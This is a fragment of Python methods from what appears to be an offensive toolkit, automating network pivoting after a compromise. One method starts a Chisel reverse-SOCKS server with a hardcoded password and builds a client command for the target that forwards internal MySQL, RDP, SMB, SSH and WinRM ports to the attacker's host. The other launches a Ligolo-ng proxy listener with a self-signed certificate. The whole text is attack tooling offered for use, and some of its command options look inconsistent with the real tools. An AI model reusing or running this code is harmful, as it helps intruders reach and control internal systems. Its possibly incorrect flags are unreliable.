    def chisel_pivot(self, lhost: str = "1.2.3.4",
                    lport: int = 8000,
                    target_internal: str = "192.168.1.0/24"):
        """Chisel — strongest TCP/UDP/HTTP tunneling + reverse socks."""
        ch = self._paths.get("chisel")
        if not ch:
            return {"error": "chisel not installed"}
        # Start server (listener)
        server_cmd = [ch, "server",
                      "--reverse",
                      "--port", str(lport),
                      "--auth", "user:P@ssw0rd!",
                      "--backend", "http://localhost:8080",
                      "--tls-key", "/tmp/key.pem",
                      "--tls-cert", "/tmp/cert.pem",
                      "--tls-ca", "/tmp/ca.pem",
                      "--socks5",
                      "-v"]
        try:
            srv_proc = subprocess.Popen(
                server_cmd, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)
            self._add("Chisel Server Started",
                      f"Reverse SOCKS5 on {lhost}:{lport}",
                      "CRITICAL")
        except Exception as e:
            return {"error": str(e)}
        # Client cmd (run on target)
        client_cmd = [ch, "client",
                      f"{lhost}:{lport}",
                      f"R:socks",
                      f"R:3306:{target_internal.split('/')[0]}:3306",
                      f"R:3389:{target_internal.split('/')[0]}:3389",
                      f"R:445:{target_internal.split('/')[0]}:445",
                      f"R:22:{target_internal.split('/')[0]}:22",
                      f"R:5985:{target_internal.split('/')[0]}:5985",
                      f"R:5986:{target_internal.split('/')[0]}:5986",
                      "--auth", "user:P@ssw0rd!"]
        self._add("Chisel — Pivot Established",
                  f"Server: {lhost}:{lport}\n"
                  f"Pivoting to: {target_internal}\n"
                  f"Forwarded: SOCKS, 3306 (MySQL), 3389 (RDP), "
                  f"445 (SMB), 22 (SSH), 5985/5986 (WinRM)",
                  "CRITICAL")
        return {"server_pid": srv_proc.pid,
                "client_cmd": " ".join(client_cmd)}

    def ligolo_pivot(self, lhost: str = "1.2.3.4",
                     lport: int = 11601):
        """Ligolo-ng — strongest pivoting with auto-certs."""
        lg = self._paths.get("ligolo-ng")
        if not lg:
            return {"error": "ligolo-ng not installed"}
        # Generate self-signed cert
        cert_path = os.path.join(self.workdir, "ligolo.crt")
        key_path = os.path.join(self.workdir, "ligolo.key")
        os.system(f"openssl req -x509 -newkey rsa:4096 -keyout {key_path} "
                  f"-out {cert_path} -days 365 -nodes "
                  "-subj '/CN=ligolo' 2>/dev/null")
        # Start proxy server
        server_cmd = [lg, "selfcert",
                      "--cert", cert_path,
                      "--key", key_path,
                      "--listener", f"{lhost}:{lport}",
                      "--allow-domains", "*",
                      "--verbose"]
        try:
            srv_proc = subprocess.Popen(
                server_cmd, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)
            self._add("Ligolo-ng Proxy Started",
                      f"Listening: {lhost}:{lport}\n"
                      "Tunnels: TCP, UDP, ICMP, IGMP",
                      "CRITICAL")
            return {"server_pid": srv_proc.pid}
        except Exception as e:
            return {"error": str(e)}

